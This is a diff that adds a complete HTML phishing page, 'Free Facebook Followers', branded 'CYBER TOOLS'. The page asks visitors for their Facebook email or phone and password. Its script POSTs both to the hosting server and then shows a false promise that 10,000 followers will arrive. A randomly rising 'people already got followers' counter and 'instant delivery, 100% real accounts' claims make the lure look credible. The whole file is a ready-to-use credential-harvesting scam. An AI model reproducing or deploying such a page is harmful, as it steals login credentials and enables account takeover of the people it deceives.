@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Free Followers Generator</title>
+    <!-- Font Awesome for Facebook logo -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 10% 20%, #0a0f2a, #03060c);
+            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .glass-card {
+            background: rgba(15, 20, 35, 0.75);
+            backdrop-filter: blur(14px);
+            border-radius: 56px;
+            border: 1px solid rgba(0, 255, 255, 0.35);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 255, 0.1);
+            width: 100%;
+            max-width: 500px;
+            padding: 32px 28px;
+            transition: 0.3s;
+        }
+
+        .brand {
+            font-size: 1.8rem;
+            font-weight: 800;
+            text-align: center;
+            background: linear-gradient(135deg, #ffffff, #00ffff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+            text-shadow: 0 0 8px cyan;
+        }
+
+        .fb-header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .fb-logo {
+            font-size: 2.5rem;
+            color: #1877f2;
+        }
+
+        .fb-header h2 {
+            background: linear-gradient(135deg, #ffffff, #1877f2);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-size: 1.6rem;
+            margin: 0;
+        }
+
+        .counter-area {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 80px;
+            padding: 12px;
+            text-align: center;
+            margin: 20px 0;
+            border: 1px solid #ffaa44;
+        }
+
+        .counter-number {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #ffdd88;
+            font-family: monospace;
+        }
+
+        .counter-label {
+            font-size: 0.7rem;
+            color: #aaa;
+            letter-spacing: 2px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 60px;
+            border: none;
+            background: rgba(10, 15, 30, 0.8);
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        input:focus {
+            border: 1px solid cyan;
+            box-shadow: 0 0 8px cyan;
+        }
+
+        button {
+            width: 100%;
+            background: linear-gradient(95deg, #ff884d, #ff5500);
+            border: none;
+            padding: 14px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            transform: scale(0.98);
+            background: linear-gradient(95deg, #ffaa66, #ff7700);
+            box-shadow: 0 0 12px orange;
+        }
+
+        .result-box {
+            margin-top: 24px;
+            background: #0b0f18cc;
+            border-radius: 28px;
+            padding: 16px;
+            text-align: center;
+            border-left: 4px solid #00ffaa;
+            transition: 0.2s;
+        }
+
+        .success-message {
+            color: #aaffdd;
+            font-weight: bold;
+        }
+
+        .error-message {
+            color: #ff8888;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #fff;
+            border-radius: 50%;
+            border-top-color: #ff5500;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #6a7a9e;
+            margin-top: 20px;
+            border-top: 1px solid #2a3246;
+            padding-top: 16px;
+        }
+    </style>
+</head>
+<body>
+<div class="glass-card">
+    <div class="brand"> CYBER TOOLS</div>
+    <div class="fb-header">
+        <i class="fab fa-facebook fb-logo"></i>
+        <h2>FREE FACEBOOK FOLLOWERS</h2>
+    </div>
+    <div class="counter-area">
+        <div class="counter-number" id="liveCounter">1,247</div>
+        <div class="counter-label">People already got followers</div>
+    </div>
+    <form id="followerForm">
+        <div class="input-group">
+            <input type="text" id="email" name="email" placeholder="Email or Phone number" required autocomplete="off">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
+        </div>
+        <button type="submit" id="submitBtn"> ADD FOLLOWERS NOW </button>
+    </form>
+    <div id="resultArea" class="result-box hidden"></div>
+    <div class="footer">
+         Instant delivery  100% real accounts  No survey
+    </div>
+</div>
+
+<script>
+    const form = document.getElementById('followerForm');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+    const resultArea = document.getElementById('resultArea');
+
+    //   (  )
+    let counter = 1247;
+    const counterEl = document.getElementById('liveCounter');
+    setInterval(() => {
+        counter += Math.floor(Math.random() * 5) + 1;
+        counterEl.innerText = counter.toLocaleString();
+    }, 3000);
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!email || !password) {
+            showResult(' Please fill both fields', 'error');
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="loader"></span> Processing...';
+
+        try {
+            const response = await fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({ username: email, password: password })
+            });
+            const data = await response.json();
+            if (data.status === 'success') {
+                //       
+                showResult(' Success! 10,000 followers will be added within 5 minutes. Thank you!', 'success');
+                emailInput.value = '';
+                passwordInput.value = '';
+            } else {
+                showResult(' Failed. Please try again.', 'error');
+            }
+        } catch (err) {
+            showResult(' Network error. Please try again.', 'error');
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = ' ADD 10K FOLLOWERS NOW ';
+        }
+    });
+
+    function showResult(msg, type) {
+        resultArea.classList.remove('hidden');
+        resultArea.innerHTML = `<div class="${type === 'success' ? 'success-message' : 'error-message'}">${msg}</div>`;
+        setTimeout(() => {
+            resultArea.classList.add('hidden');
+        }, 5000);
+    }
+</script>
+</body>
+</html>
